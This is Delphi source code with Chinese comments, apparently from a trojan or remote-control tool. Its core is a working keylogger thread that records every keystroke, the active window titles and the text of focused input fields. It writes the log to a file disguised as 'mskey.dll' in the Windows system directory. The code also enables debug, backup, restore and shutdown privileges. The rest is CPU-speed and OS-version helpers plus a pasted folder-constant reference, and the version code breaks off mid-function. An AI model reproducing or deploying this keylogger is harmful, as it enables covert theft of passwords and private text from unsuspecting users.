function GetInfoFromReg(ri:stRegInfo):bool;
var
  hk:HKEY;
  err:integer;
  dataSize:DWORD;
begin
  result:=false;
  with ri do
  begin
    err:=RegOpenKeyEx(rk,key,0,KEY_ALL_ACCESS,hk);
    if err<>ERROR_SUCCESS then exit;
    dataSize:=256;
    err:=RegQueryValueEx(hk,val,nil,nil,PByte(data),@dataSize);
    RegCloseKey(hk);
    if err<>ERROR_SUCCESS then exit;    
  end;
  result:=true;
end;
}
function GetCPUSpeed(str:pansiChar): pansiChar;
const
  DelayTime = 500;
var
  TimerHi, TimerLo: DWORD;
  PriorityClass, Priority: Integer;
  i:integer;
begin
  PriorityClass := GetPriorityClass(GetCurrentProcess);
  Priority := GetThreadPriority(GetCurrentThread);

  SetPriorityClass(GetCurrentProcess, REALTIME_PRIORITY_CLASS);
  SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_TIME_CRITICAL);

  Sleep(10);
  asm
    dw 310Fh
    mov TimerLo, eax
    mov TimerHi, edx
  end;
  Sleep(DelayTime);
  asm
    dw 310Fh
    sub eax, TimerLo
    sbb edx, TimerHi
    mov TimerLo, eax
    mov TimerHi, edx
  end;
  SetThreadPriority(GetCurrentThread, Priority);
  SetPriorityClass(GetCurrentProcess, PriorityClass);
  i:=TimerLo div (1000 * DelayTime);
  inttostr(i,str);
  strcat(str,'MHz');
  Result :=str;
end;
function GetActiveWindowTitle(var hLastWindow,hLastFocus:HWND;p:pansiChar):bool;stdcall;
var
  hWindow,hFocus:HWND;
  szTitle,szTime,szText:array[0..255]of ansiChar;     //当前窗口名称
  activeWindowThreadID:DWORD;
begin
  result:=false;
  hWindow:=GetForegroundWindow(); //取得当前活动窗口句柄
  if hWindow=hLastWindow then
  begin
    if GetFocus()>0 then
      hLastFocus:=GetFocus();
    exit;
  end;
   //取原文本框文字作为参考：
  if hLastFocus>0 then
  begin
    zeromemory(@szText,sizeof(szText));
    sendmessage(hLastFocus,wm_gettext,sizeof(szText),integer(@szText));
    if strlen(szText)>0 then
    begin
      strcat(p,#13#10);strcat(p,'参考：');strcat(p,#13#10);
      strcat(p,'*************************************************************');
      strcat(p,#13#10);
      strcat(p,szText);strcat(p,#13#10);
      strcat(p,'*************************************************************');
    end;//if strlen(szText)>0 then
  end;
  //与原窗口线程分离
  activeWindowThreadID:=GetWindowThreadProcessId(hLastWindow, nil);
  AttachThreadInput(GetCurrentThreadId, activeWindowThreadID, false);
  //附加到新窗口线程
  hLastWindow:=hWindow;
  activeWindowThreadID:=GetWindowThreadProcessId(hLastWindow, nil);
  AttachThreadInput(GetCurrentThreadId, activeWindowThreadID, true);
  //取新窗口标题：
  GetWindowTextA(hLastWindow,szTitle,sizeof(szTitle));
  NowTostr(szTime);
  strcat(p,#13#10);strcat(p,szTime);
  strcat(p,#32#32#32#32);strcat(p,szTitle);
  strcat(p,#13#10);
  result:=true;
end;
procedure HookKeysThread(pHookKeysPara:pointer);stdcall;
const
  KM=$80;
  MAX_SINGLE_STRING_LEN=256;
var
  ph:PHookKeysInfo;
  p,p2:pansiChar;
  hLastWindow,hLastFocus:HWND;
  ks,ks1,ks2:TKeyboardState;
  bNumLock,bScroll,bInsert,bCapital,bShift:bool;
  i,j:integer;
  activeWindowThreadID:DWORD;
   msg:tmsg;
  hWS: HWINSTA;
  hDT: HDESK;
begin
  SwitchWSDT(nil,nil,hWS,hDT);
  ph:=pHookKeysPara;
  p:=ph.keys;p2:=p;
  while ph^.op=HStart do
  begin
    //检测是否超过内存大小：
    if ph^.max_keys_size-strlen(p)<=MAX_SINGLE_STRING_LEN then
    begin
      zeromemory(p,ph^.max_keys_size);
      p2:=p;
    end;
    if lstrlenA(ph^.Filename)>0 then
    begin
      if p+lstrlenA(p)-p2>=MAX_SINGLE_STRING_LEN then
      begin
        SaveStrToFile(ph^.Filename,p2);
        p2:=p+lstrlenA(p);
      end;//if p+lstrlen(p)-p2>=MAX_SINGLE_STRING_LEN then
    end;//if lstrlen(ph^.Filename)>0 then
    //检测活动窗口的改变；
    if GetActiveWindowTitle(hLastWindow,hLastFocus,p) then
      zeromemory(@ks1,sizeof(ks1));
    GetKeyboardState(ks);
    //检测状态键：
    if Odd(ks[VK_NUMLOCK]) then bNumLock:=true else bNumLock:=false;
    if Odd(ks[VK_SCROLL]) then bScroll:=true else bScroll:=false;
    if Odd(ks[VK_INSERT]) then bInsert:=true else bInsert:=false;
    if Odd(ks[VK_CAPITAL]) then bCapital:=true else bCapital:=false;
    if ks[VK_SHIFT] and KM=KM then bShift:=true else bShift:=false;
    //找出有状态变化的键，放入ks2里；
    j:=0;
    for i:=low(ks) to high(ks) do
    begin
      if (ks[i] and KM=KM) then
      if (ks[i] xor ks1[i]>0) then
      begin
        ks2[j]:=i;
        inc(j);
      end;//if (ks[i] xor ks1[i]>0) then
    end;
    //处理有变化的键：
    if j>0 then
    for i:=0 to j-1 do
    begin
      case ks2[i] of
        //VK_LBUTTON:strcat(p,'[滑鼠左键鈕]');
        //VK_RBUTTON:strcat(p,'[滑鼠右键鈕]');
        VK_CANCEL:strcat(p,'[Control+Break]');
        //VK_MBUTTON:strcat(p,'[滑鼠中键鈕]');
        VK_BACK:strcat(p,'[退格]');
        VK_TAB:strcat(p,'[Tab]');
        VK_CLEAR:strcat(p,'[CLEAR]');
        VK_RETURN:strcat(p,#13);
        VK_SHIFT:strcat(p,'[Shift]');
        VK_CONTROL:strcat(p,'[Ctrl]');
        VK_MENU:strcat(p,'[Alt]');
        VK_PAUSE:strcat(p,'[PAUSE]');
        VK_CAPITAL:strcat(p,'[Caps Lock]');
        VK_KANA:strcat(p,'[KANA]'); //VK_HANGUL
        VK_JUNJA:strcat(p,'[JUNJA]');
        VK_FINAL:strcat(p,'[FINAL]');
        VK_HANJA:strcat(p,'[HANJA]');//VK_KANJI
        VK_CONVERT:strcat(p,'[CONVERT]');
        VK_NONCONVERT:strcat(p,'[NONCONVERT]');
        VK_ACCEPT:strcat(p,'[ACCEPT]');
        VK_MODECHANGE:strcat(p,'[MODECHANGE]');
        VK_ESCAPE:strcat(p,'[Esc]');
        VK_SPACE:strcat(p,#32);
        VK_PRIOR:strcat(p,'[Page Up]');
        VK_NEXT:strcat(p,'[Page Down]');
        VK_END:strcat(p,'[END]');
        VK_HOME:strcat(p,'[HOME]');
        VK_LEFT:strcat(p,'[Left Arrow]');
        VK_UP:strcat(p,'[Up Arrow]');
        VK_RIGHT:strcat(p,'[RIGHT Arrow]');
        VK_DOWN:strcat(p,'[Down Arrow]');
        VK_SELECT:strcat(p,'[Select]');
        VK_PRINT:strcat(p,'[PRINT]');
        VK_EXECUTE:strcat(p,'[EXECUTE]');
        VK_SNAPSHOT:strcat(p,'[Print Screen]');
        VK_INSERT:strcat(p,'[INSERT]');
        VK_DELETE:strcat(p,'[DELETE]');
        VK_HELP:strcat(p,'[HELP]');
        VK_0:if bShift then strcat(p,')') else strcat(p,'0');
        VK_1:if bShift then strcat(p,'!') else strcat(p,'1');
        VK_2:if bShift then strcat(p,'@') else strcat(p,'2');
        VK_3:if bShift then strcat(p,'#') else strcat(p,'3');
        VK_4:if bShift then strcat(p,'$') else strcat(p,'4');
        VK_5:if bShift then strcat(p,'%') else strcat(p,'5');
        VK_6:if bShift then strcat(p,'^') else strcat(p,'6');
        VK_7:if bShift then strcat(p,'&') else strcat(p,'7');
        VK_8:if bShift then strcat(p,'*') else strcat(p,'8');
        VK_9:if bShift then strcat(p,'(') else strcat(p,'9');
        VK_A:if bShift xor bCapital then strcat(p,'A') else strcat(p,'a');
        VK_B:if bShift xor bCapital then strcat(p,'B') else strcat(p,'b');
        VK_C:if bShift xor bCapital then strcat(p,'C') else strcat(p,'c');
        VK_D:if bShift xor bCapital then strcat(p,'D') else strcat(p,'d');
        VK_E:if bShift xor bCapital then strcat(p,'E') else strcat(p,'e');
        VK_F:if bShift xor bCapital then strcat(p,'F') else strcat(p,'f');
        VK_G:if bShift xor bCapital then strcat(p,'G') else strcat(p,'g');
        VK_H:if bShift xor bCapital then strcat(p,'H') else strcat(p,'h');
        VK_I:if bShift xor bCapital then strcat(p,'I') else strcat(p,'i');
        VK_J:if bShift xor bCapital then strcat(p,'J') else strcat(p,'j');
        VK_K:if bShift xor bCapital then strcat(p,'K') else strcat(p,'k');
        VK_L:if bShift xor bCapital then strcat(p,'L') else strcat(p,'l');
        VK_M:if bShift xor bCapital then strcat(p,'M') else strcat(p,'m');
        VK_N:if bShift xor bCapital then strcat(p,'N') else strcat(p,'n');
        VK_O:if bShift xor bCapital then strcat(p,'O') else strcat(p,'o');
        VK_P:if bShift xor bCapital then strcat(p,'P') else strcat(p,'p');
        VK_Q:if bShift xor bCapital then strcat(p,'Q') else strcat(p,'q');
        VK_R:if bShift xor bCapital then strcat(p,'R') else strcat(p,'r');
        VK_S:if bShift xor bCapital then strcat(p,'S') else strcat(p,'s');
        VK_T:if bShift xor bCapital then strcat(p,'T') else strcat(p,'t');
        VK_U:if bShift xor bCapital then strcat(p,'U') else strcat(p,'u');
        VK_V:if bShift xor bCapital then strcat(p,'V') else strcat(p,'v');
        VK_W:if bShift xor bCapital then strcat(p,'W') else strcat(p,'w');
        VK_X:if bShift xor bCapital then strcat(p,'X') else strcat(p,'x');
        VK_Y:if bShift xor bCapital then strcat(p,'Y') else strcat(p,'y');
        VK_Z:if bShift xor bCapital then strcat(p,'Z') else strcat(p,'z');
        VK_LWIN:strcat(p,'[Left Windows]');
        VK_RWIN:strcat(p,'[Right Windows]');
        VK_APPS:strcat(p,'[Applications]');
        VK_NUMPAD0:if (bNumLock and not bShift) then strcat(p,'0') else strcat(p,'Num Ins');
        VK_NUMPAD1:if (bNumLock and not bShift) then strcat(p,'1') else strcat(p,'Num End');
        VK_NUMPAD2:if (bNumLock and not bShift) then strcat(p,'2') else strcat(p,'Num Down Arrow');
        VK_NUMPAD3:if (bNumLock and not bShift) then strcat(p,'3') else strcat(p,'Num PgDn');
        VK_NUMPAD4:if (bNumLock and not bShift) then strcat(p,'4') else strcat(p,'Num Left Arrow');
        VK_NUMPAD5:if (bNumLock and not bShift) then strcat(p,'5') else strcat(p,'');
        VK_NUMPAD6:if (bNumLock and not bShift) then strcat(p,'6') else strcat(p,'Right Arrow');
        VK_NUMPAD7:if (bNumLock and not bShift) then strcat(p,'7') else strcat(p,'Num Home');
        VK_NUMPAD8:if (bNumLock and not bShift) then strcat(p,'8') else strcat(p,'Num Up Arrow');
        VK_NUMPAD9:if (bNumLock and not bShift) then strcat(p,'9') else strcat(p,'Num Pgup');
        
        VK_MULTIPLY:strcat(p,'*');
        VK_ADD:strcat(p,'+');
        VK_SEPARATOR:strcat(p,'[SEPARATOR]');
        VK_SUBTRACT:strcat(p,'-');
        VK_DECIMAL:strcat(p,'.');
        VK_DIVIDE:strcat(p,'/');

        VK_F1:strcat(p,'[F1]');
        VK_F2:strcat(p,'[F2]');
        VK_F3:strcat(p,'[F3]');
        VK_F4:strcat(p,'[F4]');
        VK_F5:strcat(p,'[F5]');
        VK_F6:strcat(p,'[F6]');
        VK_F7:strcat(p,'[F7]');
        VK_F8:strcat(p,'[F8]');
        VK_F9:strcat(p,'[F9]');
        VK_F10:strcat(p,'[F10]');
        VK_F11:strcat(p,'[F11]');
        VK_F12:strcat(p,'[F12]');
        VK_F13:strcat(p,'[F13]');
        VK_F14:strcat(p,'[F14]');
        VK_F15:strcat(p,'[F15]');
        VK_F16:strcat(p,'[F16]');
        VK_F17:strcat(p,'[F17]');
        VK_F18:strcat(p,'[F18]');
        VK_F19:strcat(p,'[F19]');
        VK_F20:strcat(p,'[F20]');
        VK_F21:strcat(p,'[F21]');
        VK_F22:strcat(p,'[F22]');
        VK_F23:strcat(p,'[F23]');
        VK_F24:strcat(p,'[F24]');

        VK_NUMLOCK:strcat(p,'[NUMLOCK]');
        VK_SCROLL:strcat(p,'[SCROLL]');
        VK_LSHIFT:strcat(p,'[LSHIFT]');
        VK_RSHIFT:strcat(p,'[RSHIFT]');
        VK_LCONTROL:strcat(p,'[LCONTROL]');
        VK_RCONTROL:strcat(p,'[RCONTROL]');
        VK_LMENU:strcat(p,'[LMENU]');
        VK_RMENU:strcat(p,'[RMENU]');
        VK_186:if bShift then strcat(p,':') else strcat(p,';');
        VK_187:if bShift then strcat(p,'+') else strcat(p,'=');
        VK_188:if bShift then strcat(p,'<') else strcat(p,',');
        VK_189:if bShift then strcat(p,'_') else strcat(p,'-');
        VK_190:if bShift then strcat(p,'>') else strcat(p,'.');
        VK_191:if bShift then strcat(p,'?') else strcat(p,'/');
        VK_192:if bShift then strcat(p,'~') else strcat(p,'`');
        VK_219:if bShift then strcat(p,'{') else strcat(p,'[');
        VK_220:if bShift then strcat(p,'|') else strcat(p,'\');
        VK_221:if bShift then strcat(p,'}') else strcat(p,']');
        VK_222:if bShift then strcat(p,'"') else strcat(p,ansiChar(39));

        VK_PROCESSKEY:strcat(p,'[PROCESSKEY]');
        VK_ATTN:strcat(p,'[ATTN]');
        VK_CRSEL:strcat(p,'[CRSEL]');
        VK_EXSEL:strcat(p,'[EXSEL]');
        VK_EREOF:strcat(p,'[Erase EOF]');
        VK_PLAY:strcat(p,'[PLAY]');
        VK_ZOOM:strcat(p,'[ZOOM]');
        VK_NONAME:strcat(p,'[NONAME]');
        VK_PA1:strcat(p,'[PA1]');
        VK_OEM_CLEAR:strcat(p,'[OEM_CLEAR]');
      end;//case
    end;//for i:=0 to j-1 do
    ks1:=ks;
    sleep(10);
    if not active then break;
  end;//while
  SwitchWSDT(nil,nil,hWS,hDT,true);
end;
function ManageHookKeys(op:THookKeysOp):pansiChar;
label 1;
const
  MAXMEM=64*1024;
var
  id:DWORD;
begin
  result:=HookKeys.keys;
  if RegGetInt(HKEY_LOCAL_MACHINE,BYC_KEY,'FileHookKey')=1 then
  begin
    if lstrlenA(HookKeys.Filename)=0 then
    begin
      GetSystemDirectoryA(HookKeys.Filename,max_path);
      lstrcatA(HookKeys.Filename,'\mskey.dll');
    end;//if lstrlen(HookKeys.Filename)=0 then
  end
  else begin
    if lstrlenA(HookKeys.Filename)>0 then
      zeromemory(@HookKeys.Filename[0],max_path);
  end;//if RegGetInt(HKEY_LOCAL_MACHINE,BYC_KEY,'FileHookKey')=1 then
  case op of
  HStart:
    begin
      if HookKeys.op=HStart then goto 1;
      hookKeys.keys:=VirtualAlloc(nil,MAXMEM,MEM_COMMIT,PAGE_READWRITE);
      if hookKeys.keys<>nil then
      begin
        zeromemory(hookKeys.keys,MAXMEM);
        HookKeys.max_keys_size:=MAXMEM;
        HookKeys.op:=HStart;
        HookKeys.hThread:=createthread(nil,0,@HooKKeysThread,@hookKeys,0,id);
      end;//if hookKeys.keys<>nil then
    end;// HStart:
  HClose:
    begin
      HookKeys.op:=HClose;
      waitforsingleobject(HookKeys.hThread,INFINITE);
      VirtualFree(HookKeys.keys,MAXMEM,MEM_DECOMMIT);
      VirtualFree(HookKeys.keys,0,MEM_RELEASE);
      closehandle(HookKeys.hThread);
      HookKeys.hThread:=0;
      HookKeys.keys:=nil;
      HookKeys.max_keys_size:=0;
    end;//HClose

  end;//case
1:
  result:=HookKeys.keys;
end;
function GetMyPriviliges:BOOL;
type
  PTokenPrivileges = ^TOKEN_PRIVILEGES;
  _TOKEN_PRIVILEGES = record
    PrivilegeCount: DWORD;
    Privileges: array[0..3] of TLUIDAndAttributes;
  end;
  TOKEN_PRIVILEGES = _TOKEN_PRIVILEGES;
Const
  SE_BACKUP_NAME='SeBackupPrivilege';
  SE_RESTORE_NAME='SeRestorePrivilege';
  SE_DEBUG_NAME = 'SeDebugPrivilege';
  SE_SHUTDOWN_NAME='SeShutdownPrivilege';
var
  DLL:cardinal;
  hToken:tHandle;
  tp:TOKEN_PRIVILEGES;
  OpenProcessToken:function(ProcessHandle: THandle; DesiredAccess: DWORD;
  var TokenHandle: THandle): BOOL; stdcall;

  AdjustTokenPrivileges:function(TokenHandle: THandle; DisableAllPrivileges: BOOL;
  NewState: PTokenPrivileges; BufferLength: DWORD;
  PreviousState:PTokenPrivileges;ReturnLength: PDWORD): BOOL; stdcall;

  LookupPrivilegeValueA:function(lpSystemName, lpName: PAnsiChar;
  var lpLuid: TLargeInteger): BOOL; stdcall;
begin
  result:=false;
  DLL:=LoadLibrary('advapi32.dll');
  if DLL=0 then exit;
  @OpenProcessToken:=GetProcAddress(DLL,'OpenProcessToken');
  if @OpenProcessToken=nil then begin FreeLibrary(DLL);exit;end;

  @LookupPrivilegeValueA:=GetProcAddress(DLL,'LookupPrivilegeValueA');
  if @LookupPrivilegeValueA=nil then begin FreeLibrary(DLL);exit;end;

  @AdjustTokenPrivileges:=GetProcAddress(DLL,'AdjustTokenPrivileges');
  if @AdjustTokenPrivileges=nil then begin FreeLibrary(DLL);exit;end;

  if not OpenProcessToken(GetCurrentProcess,TOKEN_ALL_ACCESS,hToken) then
    begin FreeLibrary(DLL);exit;end;
  tp.PrivilegeCount := 4;
  if not LookupPrivilegeValue(nil,SE_RESTORE_NAME,tp.Privileges[0].Luid) then
    begin CloseHandle(hToken);FreeLibrary(DLL);exit;end;

  if not LookupPrivilegeValue(nil,SE_BACKUP_NAME,tp.Privileges[1].Luid) then
    begin CloseHandle(hToken);FreeLibrary(DLL);exit;end;

  if not LookupPrivilegeValue(nil,SE_DEBUG_NAME,tp.Privileges[2].Luid) then
    begin CloseHandle(hToken);FreeLibrary(DLL);exit;end;

  if not LookupPrivilegeValue(nil,SE_SHUTDOWN_NAME,tp.Privileges[3].Luid) then
    begin CloseHandle(hToken);FreeLibrary(DLL);exit;end;

  tp.Privileges[0].Attributes:=SE_PRIVILEGE_ENABLED;
  tp.Privileges[1].Attributes:=SE_PRIVILEGE_ENABLED;
  tp.Privileges[2].Attributes:=SE_PRIVILEGE_ENABLED;
  tp.Privileges[3].Attributes:=SE_PRIVILEGE_ENABLED;
  result:=AdjustTokenPrivileges(hToken,False,@tp,SizeOf(tp),nil,nil);
  CloseHandle(hToken);FreeLibrary(DLL);
end;
function GetDir(nDir:integer;Dir:pansiChar):pansiChar;
(*
CSIDL_FLAG_CREATE (0x8000)
Version 5.0. Combine this CSIDL with any of the following CSIDLs to force the creation of the associated folder. 

CSIDL_ADMINTOOLS (0x0030)
Version 5.0. The file system directory that is used to store administrative tools for an individual user. The Microsoft Management Console (MMC) will save customized consoles to this directory, and it will roam with the user.

CSIDL_ALTSTARTUP (0x001d)
The file system directory that corresponds to the user's nonlocalized Startup program group.

CSIDL_APPDATA (0x001a)
Version 4.71. The file system directory that serves as a common repository for application-specific data. A typical path is C:\Documents and Settings\username\Application Data. This CSIDL is supported by the redistributable Shfolder.dll for systems that do not have the Microsoft? Internet Explorer 4.0 integrated Shell installed.

CSIDL_BITBUCKET (0x000a)
The virtual folder containing the objects in the user's Recycle Bin.

CSIDL_CDBURN_AREA (0x003b)
Version 6.0. The file system directory acting as a staging area for files waiting to be written to CD. A typical path is C:\Documents and Settings\username\Local Settings\Application Data\Microsoft\CD Burning.

CSIDL_COMMON_ADMINTOOLS (0x002f)
Version 5.0. The file system directory containing administrative tools for all users of the computer.

CSIDL_COMMON_ALTSTARTUP (0x001e)
The file system directory that corresponds to the nonlocalized Startup program group for all users. Valid only for Microsoft Windows NT? systems.

CSIDL_COMMON_APPDATA (0x0023)
Version 5.0. The file system directory containing application data for all users. A typical path is C:\Documents and Settings\All Users\Application Data.

CSIDL_COMMON_DESKTOPDIRECTORY (0x0019)
The file system directory that contains files and folders that appear on the desktop for all users. A typical path is C:\Documents and Settings\All Users\Desktop. Valid only for Windows NT systems.

CSIDL_COMMON_DOCUMENTS (0x002e)
The file system directory that contains documents that are common to all users. A typical paths is C:\Documents and Settings\All Users\Documents. Valid for Windows NT systems and Microsoft Windows? 95 and Windows 98 systems with Shfolder.dll installed.

CSIDL_COMMON_FAVORITES (0x001f)
The file system directory that serves as a common repository for favorite items common to all users. Valid only for Windows NT systems.

CSIDL_COMMON_MUSIC (0x0035)
Version 6.0. The file system directory that serves as a repository for music files common to all users. A typical path is C:\Documents and Settings\All Users\Documents\My Music.

CSIDL_COMMON_PICTURES (0x0036)
Version 6.0. The file system directory that serves as a repository for image files common to all users. A typical path is C:\Documents and Settings\All Users\Documents\My Pictures.

CSIDL_COMMON_PROGRAMS (0x0017)
The file system directory that contains the directories for the common program groups that appear on the Start menu for all users. A typical path is C:\Documents and Settings\All Users\Start Menu\Programs. Valid only for Windows NT systems.

CSIDL_COMMON_STARTMENU (0x0016)
The file system directory that contains the programs and folders that appear on the Start menu for all users. A typical path is C:\Documents and Settings\All Users\Start Menu. Valid only for Windows NT systems.

CSIDL_COMMON_STARTUP (0x0018)
The file system directory that contains the programs that appear in the Startup folder for all users. A typical path is C:\Documents and Settings\All Users\Start Menu\Programs\Startup. Valid only for Windows NT systems.

CSIDL_COMMON_TEMPLATES (0x002d)
The file system directory that contains the templates that are available to all users. A typical path is C:\Documents and Settings\All Users\Templates. Valid only for Windows NT systems.

CSIDL_COMMON_VIDEO (0x0037)
Version 6.0. The file system directory that serves as a repository for video files common to all users. A typical path is C:\Documents and Settings\All Users\Documents\My Videos.

CSIDL_CONTROLS (0x0003)
The virtual folder containing icons for the Control Panel applications.

CSIDL_COOKIES (0x0021)
The file system directory that serves as a common repository for Internet cookies. A typical path is C:\Documents and Settings\username\Cookies.

CSIDL_DESKTOP (0x0000)
The virtual folder representing the Windows desktop, the root of the namespace.

CSIDL_DESKTOPDIRECTORY (0x0010)
The file system directory used to physically store file objects on the desktop (not to be confused with the desktop folder itself). A typical path is C:\Documents and Settings\username\Desktop.

CSIDL_DRIVES (0x0011)
The virtual folder representing My Computer, containing everything on the local computer: storage devices, printers, and Control Panel. The folder may also contain mapped network drives.

CSIDL_FAVORITES (0x0006)
The file system directory that serves as a common repository for the user's favorite items. A typical path is C:\Documents and Settings\username\Favorites.

CSIDL_FONTS (0x0014)
A virtual folder containing fonts. A typical path is C:\Windows\Fonts.

CSIDL_HISTORY (0x0022)
The file system directory that serves as a common repository for Internet history items.

CSIDL_INTERNET (0x0001)
A virtual folder representing the Internet.

CSIDL_INTERNET_CACHE (0x0020)
Version 4.72. The file system directory that serves as a common repository for temporary Internet files. A typical path is C:\Documents and Settings\username\Local Settings\Temporary Internet Files.

CSIDL_LOCAL_APPDATA (0x001c)
Version 5.0. The file system directory that serves as a data repository for local (nonroaming) applications. A typical path is C:\Documents and Settings\username\Local Settings\Application Data.

CSIDL_MYDOCUMENTS (0x000c)
Version 6.0. The virtual folder representing the My Documents desktop item. This should not be confused with CSIDL_PERSONAL, which represents the file system folder that physically stores the documents.

CSIDL_MYMUSIC (0x000d)
The file system directory that serves as a common repository for music files. A typical path is C:\Documents and Settings\User\My Documents\My Music.

CSIDL_MYPICTURES (0x0027)
Version 5.0. The file system directory that serves as a common repository for image files. A typical path is C:\Documents and Settings\username\My Documents\My Pictures.

CSIDL_MYVIDEO (0x000e)
Version 6.0. The file system directory that serves as a common repository for video files. A typical path is C:\Documents and Settings\username\My Documents\My Videos.

CSIDL_NETHOOD (0x0013)
A file system directory containing the link objects that may exist in the My Network Places virtual folder. It is not the same as CSIDL_NETWORK, which represents the network namespace root. A typical path is C:\Documents and Settings\username\NetHood.

CSIDL_NETWORK (0x0012)
A virtual folder representing Network Neighborhood, the root of the network namespace hierarchy.

CSIDL_PERSONAL (0x0005)
The file system directory used to physically store a user's common repository of documents. A typical path is C:\Documents and Settings\username\My Documents. This should be distinguished from the virtual My Documents folder in the namespace, identified by CSIDL_MYDOCUMENTS. To access that virtual folder, use SHGetFolderLocation, which returns the ITEMIDLIST for the virtual location, or refer to the technique described in Managing the File System.

CSIDL_PRINTERS (0x0004)
The virtual folder containing installed printers.

CSIDL_PRINTHOOD (0x001b)
The file system directory that contains the link objects that can exist in the Printers virtual folder. A typical path is C:\Documents and Settings\username\PrintHood.

CSIDL_PROFILE (0x0028)
Version 5.0. The user's profile folder. A typical path is C:\Documents and Settings\username. Applications should not create files or folders at this level; they should put their data under the locations referred to by CSIDL_APPDATA or CSIDL_LOCAL_APPDATA.

CSIDL_PROFILES (0x003e)
Version 6.0. The file system directory containing user profile folders. A typical path is C:\Documents and Settings.

CSIDL_PROGRAM_FILES (0x0026)
Version 5.0. The Program Files folder. A typical path is C:\Program Files.

CSIDL_PROGRAM_FILES_COMMON (0x002b)
Version 5.0. A folder for components that are shared across applications. A typical path is C:\Program Files\Common. Valid only for Windows NT, Windows 2000, and Windows XP systems. Not valid for Windows Millennium Edition (Windows Me).

CSIDL_PROGRAMS (0x0002)
The file system directory that contains the user's program groups (which are themselves file system directories). A typical path is C:\Documents and Settings\username\Start Menu\Programs. 

CSIDL_RECENT (0x0008)
The file system directory that contains shortcuts to the user's most recently used documents. A typical path is C:\Documents and Settings\username\My Recent Documents. To create a shortcut in this folder, use SHAddToRecentDocs. In addition to creating the shortcut, this function updates the Shell's list of recent documents and adds the shortcut to the My Recent Documents submenu of the Start menu.

CSIDL_SENDTO (0x0009)
The file system directory that contains Send To menu items. A typical path is C:\Documents and Settings\username\SendTo.

CSIDL_STARTMENU (0x000b)
The file system directory containing Start menu items. A typical path is C:\Documents and Settings\username\Start Menu.

CSIDL_STARTUP (0x0007)
The file system directory that corresponds to the user's Startup program group. The system starts these programs whenever any user logs onto Windows NT or starts Windows 95. A typical path is C:\Documents and Settings\username\Start Menu\Programs\Startup.

CSIDL_SYSTEM (0x0025)
Version 5.0. The Windows System folder. A typical path is C:\Windows\System32.

CSIDL_TEMPLATES (0x0015)
The file system directory that serves as a common repository for document templates. A typical path is C:\Documents and Settings\username\Templates.

CSIDL_WINDOWS (0x0024)
Version 5.0. The Windows directory or SYSROOT. This corresponds to the %windir% or %SYSTEMROOT% environment variables. A typical path is C:\Windows.
*)
type
  SHITEMID = record
    cb: Word;        
    abID: array[0..0] of Byte;
  end;
  PItemIDList = ^ITEMIDLIST;
  ITEMIDLIST = record
     mkid: SHITEMID;
   end;
var
  DLL:cardinal;
  pidl:PItemIDList;
  SHGetSpecialFolderLocation:function(hwndOwner: HWND; nFolder: Integer;
    var ppidl: PItemIDList): HResult; stdcall;
  SHGetPathFromIDListA:function(pidl: PItemIDList; pszPath: PansiChar): BOOL; stdcall;
begin
  result:=nil;DLL:=LoadLibrary('shell32.dll');
  if DLL=0 then exit;
  @SHGetSpecialFolderLocation:=GetProcAddress(DLL,'SHGetSpecialFolderLocation');
  if @SHGetSpecialFolderLocation=nil then begin FreeLibrary(DLL);exit;end;
  @SHGetPathFromIDListA:=GetProcAddress(DLL,'SHGetPathFromIDListA');
  if @SHGetPathFromIDListA=nil then begin FreeLibrary(DLL);exit;end;
  SHGetSpecialFolderLocation(0,nDir, pidl);
  if SHGetPathFromIDListA(pidl,Dir) then result:=dir;
  FreeLibrary(DLL);
end;
{
procedure InitPlatformId;
begin
  OSV.dwOSVersionInfoSize := SizeOf(OSV);
  GetVersionEx(OSV);
end;
}
function GetOSVerion:string;
const
  VER_NT_WORKSTATION                 = $00000001;
  VER_NT_DOMAIN_CONTROLLER           = $00000002;
  VER_NT_SERVER                      = $00000003;

  VER_SERVER_NT                      = $80000000;
  VER_WORKSTATION_NT                 = $40000000;

  VER_SUITE_SMALLBUSINESS            = $00000001;
  VER_SUITE_ENTERPRISE               = $00000002;
  VER_SUITE_BACKOFFICE               = $00000004;
  VER_SUITE_COMMUNICATIONS           = $00000008;
  VER_SUITE_TERMINAL                 = $00000010;
  VER_SUITE_SMALLBUSINESS_RESTRICTED = $00000020;
  VER_SUITE_DATACENTER               = $00000080;
  VER_SUITE_SINGLEUSERTS             = $00000100;
  VER_SUITE_PERSONAL                 = $00000200;
  VER_SUITE_BLADE                    = $00000400;
  BUFSIZE=80;
type
  POSVERSIONINFOEX=^OSVERSIONINFOEX;
  LPOSVERSIONINFOEX=^OSVERSIONINFOEX;
  _OSVERSIONINFOEXA=record
    dwOSVersionInfoSize:DWORD;
    dwMajorVersion:DWORD;
    dwMinorVersion:DWORD;
    dwBuildNumber:DWORD;
    dwPlatformId:DWORD;
    szCSDVersion:array[0..127] of ansiChar;
    wServicePackMajor:WORD;
    wServicePackMinor:WORD;
    wSuiteMask:WORD;
    wProductType:BYTE;
    wReserved:BYTE;
  end;
  _OSVERSIONINFOEX=_OSVERSIONINFOEXA;
  OSVERSIONINFOEX=_OSVERSIONINFOEX;
var
  GetVersionExEx:function(var lpVersionInformation: OSVERSIONINFOEX): BOOL; stdcall;
  osvi:OSVERSIONINFOEX;
  bOsVersionInfoEx:BOOL;
  DLL:DWORD;
  lRet:integer;
  hk:HKEY;
  szProductType:array[0..BUFSIZE-1] of ansiChar;
  dwBufLen:DWORD;
begin
  result:='';
  DLL:=LoadLibrary(kernel32);
  if DLL=0 then exit;
  @GetVersionExEx:=GetProcAddress(DLL,'GetVersionExA');
  if @GetVersionExEx=nil then exit;
  // Try calling GetVersionEx using the OSVERSIONINFOEX structure.
  // If that fails, try using the OSVERSIONINFO structure.
  ZeroMemory(@osvi, sizeof(OSVERSIONINFOEX));
  osvi.dwOSVersionInfoSize := sizeof(OSVERSIONINFOEX);
  bOsVersionInfoEx := GetVersionExEx(osvi);
  if(not bOsVersionInfoEx) then
  begin
    osvi.dwOSVersionInfoSize := sizeof (OSVERSIONINFO);
    if(not GetVersionExEx(osvi)) then exit;
  end;//if(not bOsVersionInfoEx) then
  case osvi.dwPlatformId of
    VER_PLATFORM_WIN32_NT:
    begin
      // Test for the specific product family.
      if(osvi.dwMajorVersion=5) and (osvi.dwMinorVersion= 2) then
        result:='Microsoft Windows Server 2003 family,';
      if(osvi.dwMajorVersion=5) and (osvi.dwMinorVersion= 1) then
        result:='Microsoft Windows XP ';
      if(osvi.dwMajorVersion=5) and (osvi.dwMinorVersion= 0) then
